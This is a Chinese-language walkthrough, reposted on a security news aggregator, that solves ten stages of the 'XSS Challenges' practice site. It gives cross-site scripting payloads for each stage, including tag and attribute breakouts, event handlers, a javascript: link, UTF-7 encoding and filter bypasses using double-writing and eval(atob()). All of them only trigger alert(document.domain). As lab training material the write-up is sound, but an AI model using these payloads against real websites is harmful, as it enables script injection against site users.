---
title: XSS Challenges通关教程
url: https://buaq.net/go-148027.html
source: unSafe.sh - 不安全
date: 2023-02-06
fetch_date: 2025-10-04T05:47:08.105299
---

# XSS Challenges通关教程

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/241b5256d831e0d1e00fa7a4b3f79d5d.jpg)

XSS Challenges通关教程

Stage#1直接在search 输入框中输入payload：<script>alert(document.domain)</script>点击search就
*2023-2-5 15:30:0
Author: [xz.aliyun.com(查看原文)](/jump-148027.htm)
阅读量:40
收藏*

---

## **Stage#1**

直接在search 输入框中输入payload：

`<script>alert(document.domain)</script>`

点击search就XSS攻击成功了。

![](https://img-blog.csdnimg.cn/1a06f13e09364cc78d87411e180c4837.png)

## **Stage #2**

尝试直接输入`<script>alert(document.domain)</script>`，发现并未完成通关，查看Hint提示，需要：close the current tag and add SCRIPT tag...。

![](https://img-blog.csdnimg.cn/ee56a1f684b0413498298e41bb053d10.png)

然后右键查看网页源码，发现可以闭合输入框的HTML标签：value="">。

Search输入框输入payload：

`"><script>alert(document.domain)</script><"`

点击搜索，正确通关。

![](https://img-blog.csdnimg.cn/14ad8ed4c08b49eb99d3a451d91fff6b.png)

## **Stage #3**

尝试了一下前两关的注入方式，发现都没有反应，然后看了一下Hint提示，说搜索框已经正确做了转移，然后看了一下页面源码，确实是进行了转移处理。

![](https://img-blog.csdnimg.cn/86ea3fe6cbc941e9aeb01a5371688910.png)

那这个输入框就没有办法进行注入了，看网页源码，发现这是一个post请求，并且后边的Choose a country没有做处理，那这里就是攻击点了，页面上没有办法操作。

![](https://img-blog.csdnimg.cn/24e757079ff74db4a9fc0f4a1bde96f9.png)

构造post数据包

`p1=1&p2=<script>alert(document.domain)</script>`

burp改包

![](https://img-blog.csdnimg.cn/33467b8759304e90abee6ff1c550b7c7.png)

成功通关

![](https://img-blog.csdnimg.cn/0b355cb546ed4fffb75029e2512a8863.png)

## **Stage #4**

burp抓包发现参数p3

![](https://img-blog.csdnimg.cn/7fd9b81afa7a452491d5cef6458cf856.png)

在源代码中查找hackme

![](https://img-blog.csdnimg.cn/6ce8303e68b14deebb82593f4ca2b3d6.png)

类似stage2，构造payload：

`p1=123&p2=Japan&p3="><script>alert(document.domain)</script><`

成功通关

![](https://img-blog.csdnimg.cn/162a283d8f1b4922b1db160b99595b89.png)

## **Stage #5**

![](https://img-blog.csdnimg.cn/1935f4ce5c38461db340125067730580.png)

审查源码，发现与stage2相仿，但是有个maxlenth限制长度，因为是js，就直接修改maxlenth为50

![](https://img-blog.csdnimg.cn/681b8857e50e404f966dcca6e1bfeed3.png)

然后输入

`"><script>alert(document.domain)</script><`

成功通关

![](https://img-blog.csdnimg.cn/6eacc46da1ff4e89ba3c9243a29060cf.png)

## **Stage #6**

![](https://img-blog.csdnimg.cn/64d5d466ea75486f9a41f5242287478c.png)

与stage2相仿，构造payload：

`"><script>alert(document.domain)</script><`

发现<>符号被HTML特殊字符代替，说明输入内容被HTML实体编码

![](https://img-blog.csdnimg.cn/9a740e575ad04a5bb4dd36d6dfd10368.png)

不过双引号可用，构造payload

`" onmouseover="alert(document.domain)">`

当鼠标再次移动到搜索框就会触发弹窗

![](https://img-blog.csdnimg.cn/2ae565deda1b428c84c031a336c224ab.png)

## **Stage #7**

构造payload：

`"><script>alert(document.domain)</script><`

发现过滤了双引号

![](https://img-blog.csdnimg.cn/0076e909c4324362bc9364062e699e48.png)

构造payload：

`s onmouseover=alert(document.domain)`

当鼠标移动到搜索框就会触发弹窗

![](https://img-blog.csdnimg.cn/b64664b3413d486fb2d7ede75c255257.png)

## **Stage #8**

构造payload：

`<script>alert(document.domain)</script>`

发现出现在一个标签里

![](https://img-blog.csdnimg.cn/163088ab54414ad48bd6121b98585afc.png)

制作成一个链接使其弹出一个窗口，那么只需要在标签中添加一个JavaScript伪链接即可

`javascript:alert(document.domain);`

点击JavaScript伪链接即可弹窗

![](https://img-blog.csdnimg.cn/f6eb7c774d1f4e8386fd12d21b2ec0f8.png)

## **Stage #9**

构造payload：

`<script>alert(document.domain)</script>`

发现一个隐藏参数euc-jp，查了下发现是日本编码

![](https://img-blog.csdnimg.cn/3b553508e54e449bab7a285c35577f01.png)

需要使用 IE7浏览器，将payload构造为 UTF-7编码

`p1=1%2bACI- οnmοuseοver=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&charset=UTF-7`

控制台直接绕过

![](https://img-blog.csdnimg.cn/8204cd5e659140f493cc3e9786d05404.png)

成功通关

![](https://img-blog.csdnimg.cn/05acf6b0036d4ff58f0abe2852e9e870.png)

## **Stage #10**

构造payload：

`<script>alert(document.domain)</script>`

发现domain被过滤了

![](https://img-blog.csdnimg.cn/aa9f43e0a2ff460ab2e577cbe0206435.png)

方法一双写绕过

`"><script>alert(document.dodomainmain)</script><`

成功通关

![](https://img-blog.csdnimg.cn/1634b4d66ae24210a68145174dd929a1.png)

方法二：

`"><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>`

把document.domdomainain);进行Base64转码，再运用atob方法回复成原字符串，再通过eval函数，执行document.domdomainain);，就可以达到效果了

![](https://img-blog.csdnimg.cn/ee8dc033fc3e4d218ad4cd9993bc673d.png)

文笔生疏，措辞浅薄，望各位大佬不吝赐教，万分感谢。

免责声明：由于传播或利用此文所提供的信息、技术或方法而造成的任何直接或间接的后果及损失，均由使用者本人负责， 文章作者不为此承担任何责任。

转载声明：儒道易行 拥有对此文章的修改和解释权，如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经作者允许，不得任意修改或者增减此文章的内容，不得以任何方式将其用于商业目的。

文章来源: https://xz.aliyun.com/t/12112
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)